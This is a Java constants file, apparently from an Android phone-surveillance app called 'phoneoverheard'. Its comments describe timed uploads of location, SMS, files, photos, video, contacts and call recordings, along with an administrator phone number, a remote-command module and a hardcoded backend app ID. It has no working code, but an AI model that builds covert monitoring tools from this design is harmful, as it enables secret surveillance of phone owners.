package com.phoneoverheard.interfaces;

public class Constant {

	public static final String BMOB_APP_ID = "404e868375438ee2f3b5f0d2a37e4d14";

	/**
	 * 系统定时广播
	 */
	public static final String INTENT_ACTION_TIMER_SYSTEM = "com.timer_system";
	/**
	 * 定时检查提交评价短信
	 */
	public static final String INTENT_ACTION_TIMER_CHECK_TO_SUBMIT = "com.timer_check_to_submit";
	/**
	 * 记录上次的清理时间
	 */
	public static final String KEY_TIME_TO_CLEAN = "KEY_TIME_TO_CLEAN";

	/**
	 * 定时检测时间间隔
	 */
	public static int ALARM_INTERVAL_HOUR_TO_CHECK_SUBMIT = 1;

	/**************************** 消息码 ************************************************/
	/**
	 * 检查常态定位并上传
	 */
	public static final int MSG_CODE_CHECK_LOC_NORMAL = 1;
	/**
	 * 检查短信表并上传
	 */
	public static final int MSG_CODE_CHECK_SMS = 2;
	/**
	 * 检查文件表并上传
	 */
	public static final int MSG_CODE_CHECK_FILE_UPLOAD = 3;

	/**
	 * 检查文件表并上传
	 */
	public static final int MSG_CODE_CHECK_LOC_EXACT = 4;

	/***** shared preference key *********/
	/**
	 * 管理员手机号码
	 */
	public static final String KEY_AMDIN_PHONE_NUM = "KEY_AMDIN_PHONE_NUM";
	/**
	 * 用户信息
	 */
	public static final String KEY_USER_INFO = "KEY_USER_INFO";

	/**
	 * 定位模块
	 */
	public static final String MODULE_LOC = "loc";
	public static final String MODULE_PHOTO = "photo";
	public static final String MODULE_SMS = "sms";
	public static final String MODULE_CALL = "call";
	public static final String MODULE_VIDEO = "video";
	public static final String MODULE_CMD = "cmd";
	public static final String MODULE_CONTACT = "contact";

	/**** 通话录音 *******/
	public static final int STATE_INCOMING_NUMBER = 1;
	public static final int STATE_CALL_START = 2;
	public static final int STATE_CALL_END = 3;
	public static final int STATE_OUTGOING_NUMBER = 4;
}
